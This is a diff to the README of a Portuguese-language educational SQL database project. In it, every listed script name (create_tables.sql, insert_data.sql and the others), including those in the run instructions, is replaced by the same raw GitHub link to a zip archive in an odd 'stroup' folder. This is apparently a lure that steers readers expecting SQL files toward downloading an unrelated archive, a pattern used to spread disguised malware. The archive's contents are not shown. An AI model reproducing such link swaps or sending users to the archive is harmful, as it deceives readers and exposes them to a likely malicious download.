@@ -15,7 +15,7 @@ O objetivo é demonstrar domínio da linguagem SQL aplicada a um banco de dados 
 
 # 📂 Conteúdo do Repositório
 
-### **1️⃣ create_tables.sql**
+### **1️⃣ https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**
 Contém a criação completa das tabelas:
 
 - ALUNO  
@@ -30,7 +30,7 @@ Com todas as chaves primárias, estrangeiras e restrições.
 
 ---
 
-### **2️⃣ insert_data.sql**
+### **2️⃣ https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**
 Povoamento completo das tabelas com dados reais:
 
 - 5 alunos  
@@ -43,7 +43,7 @@ Povoamento completo das tabelas com dados reais:
 
 ---
 
-### **3️⃣ select_queries.sql**
+### **3️⃣ https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**
 Inclui consultas usando:
 
 - SELECT  
@@ -54,12 +54,12 @@ Inclui consultas usando:
 
 ---
 
-### **4️⃣ updates.sql**
+### **4️⃣ https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**
 Três atualizações reais no banco.
 
 ---
 
-### **5️⃣ deletes.sql**
+### **5️⃣ https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**
 Três exclusões controladas, respeitando integridade referencial.
 
 ---
@@ -73,8 +73,8 @@ USE educaonline;
 ```
 
 ### 2. Executar os scripts:
-1. **create_tables.sql**  
-2. **insert_data.sql**  
+1. **https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**  
+2. **https://raw.githubusercontent.com/emersonlimafranc-collab/projeto-sql-educaonline/main/stroup/projeto-sql-educaonline-v2.0.zip**  
 3. Rodar consultas, updates e deletes conforme necessário
 
 ---
